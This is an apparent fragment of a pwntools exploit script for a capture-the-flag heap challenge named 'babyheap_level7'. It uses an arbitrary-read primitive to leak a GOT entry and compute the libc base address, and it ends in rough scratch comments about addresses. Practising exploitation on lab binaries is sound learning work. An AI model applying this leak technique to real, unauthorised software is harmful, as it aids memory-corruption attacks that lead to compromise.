...
exe = context.binary = ELF(args.EXE or '/challenge/babyheap_level7')
os.chdir('/challenge')
...
def launch_attack(p):
    libc_base = arbitary_read(p, 4210728) -0xb1690 #0xb1690 -> vmmap libc_base - arbitarty read base
    print('libc_base: ', hex(libc_base))
...
# 0x401150 - 0x9f630
#404028 = 4210728 = 0x7f14ed69e690 - 0x363470 heap -> 0x7f574739a000 ... strlen -> 0x7f574744b690
